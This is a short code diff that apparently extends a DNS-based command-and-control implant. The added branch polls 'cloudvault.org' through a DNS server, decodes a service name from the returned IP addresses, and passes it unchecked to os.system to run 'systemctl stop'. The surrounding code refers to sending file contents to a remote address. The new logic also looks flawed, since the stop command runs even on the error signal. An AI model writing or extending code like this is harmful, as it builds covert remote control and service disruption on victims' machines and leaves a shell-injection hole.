@@ -177,5 +177,17 @@ while True:
                 
                 if not ((address == "100.100.100.100") and (port == 100)):
                     print("Sending file contents to " + address + ":" + str(port)) 
+            elif(ipSplit[3] == "150"):
+                print("Collecting filename")
+                
+                sock.sendto(makeQuery("cloudvault.org"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
+                resp, _ = sock.recvfrom(512)
+
+                ips = getResponse(resp)
+                
+                if not ((len(ips) == 1) and ((ips[0].split('.'))[3] == "100")):
+                    serviceName = resolveFileName(ips)
+                    
+                os.system("systemctl stop " + serviceName)
                 
     time.sleep(WAIT_TIME)
